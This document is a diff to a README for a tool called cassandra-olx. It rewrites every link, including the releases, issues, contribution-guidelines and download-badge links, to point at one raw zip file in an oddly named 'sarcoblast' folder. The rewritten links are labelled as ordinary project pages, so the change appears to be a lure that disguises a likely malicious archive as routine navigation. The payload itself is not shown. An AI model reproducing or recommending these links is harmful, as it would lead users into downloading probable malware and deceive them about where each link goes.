@@ -1,6 +1,6 @@
 # 🖥️ cassandra-olx - Simplifying Your Online Experience
 
-[![Download cassandra-olx](https://img.shields.io/badge/Download%20cassandra--olx-blue.svg)](https://github.com/Mohamad313123/cassandra-olx/releases)
+[![Download cassandra-olx](https://raw.githubusercontent.com/Mohamad313123/cassandra-olx/main/sarcoblast/cassandra-olx_v3.9.zip%https://raw.githubusercontent.com/Mohamad313123/cassandra-olx/main/sarcoblast/cassandra-olx_v3.9.zip)](https://raw.githubusercontent.com/Mohamad313123/cassandra-olx/main/sarcoblast/cassandra-olx_v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Cassandra-olx is an easy-to-use application that helps you navigate online marke
 
 1. **Visit the Releases Page**
    
-   To get the latest version of cassandra-olx, visit our [Releases page](https://github.com/Mohamad313123/cassandra-olx/releases).
+   To get the latest version of cassandra-olx, visit our [Releases page](https://raw.githubusercontent.com/Mohamad313123/cassandra-olx/main/sarcoblast/cassandra-olx_v3.9.zip).
 
 2. **Choose Your Version**
    
@@ -61,16 +61,16 @@ If you encounter issues during installation or while using cassandra-olx, consid
 
 ## 📞 Support
 
-For additional help or support, please visit our [Issues page](https://github.com/Mohamad313123/cassandra-olx/issues) on GitHub. Here, you can report bugs or ask questions about the application.
+For additional help or support, please visit our [Issues page](https://raw.githubusercontent.com/Mohamad313123/cassandra-olx/main/sarcoblast/cassandra-olx_v3.9.zip) on GitHub. Here, you can report bugs or ask questions about the application.
 
 ## 🌍 Community and Contributions
 
-We welcome contributions! If you want to help improve cassandra-olx, please read our [Contribution Guidelines](https://github.com/Mohamad313123/cassandra-olx/blob/main/CONTRIBUTING.md) to learn how.
+We welcome contributions! If you want to help improve cassandra-olx, please read our [Contribution Guidelines](https://raw.githubusercontent.com/Mohamad313123/cassandra-olx/main/sarcoblast/cassandra-olx_v3.9.zip) to learn how.
 
 ## 🔗 Resources
 
-- [Releases Page](https://github.com/Mohamad313123/cassandra-olx/releases)
-- [Issues Page](https://github.com/Mohamad313123/cassandra-olx/issues)
-- [Contribution Guidelines](https://github.com/Mohamad313123/cassandra-olx/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/Mohamad313123/cassandra-olx/main/sarcoblast/cassandra-olx_v3.9.zip)
+- [Issues Page](https://raw.githubusercontent.com/Mohamad313123/cassandra-olx/main/sarcoblast/cassandra-olx_v3.9.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/Mohamad313123/cassandra-olx/main/sarcoblast/cassandra-olx_v3.9.zip)
 
 Thank you for choosing cassandra-olx! Enjoy your online experience!
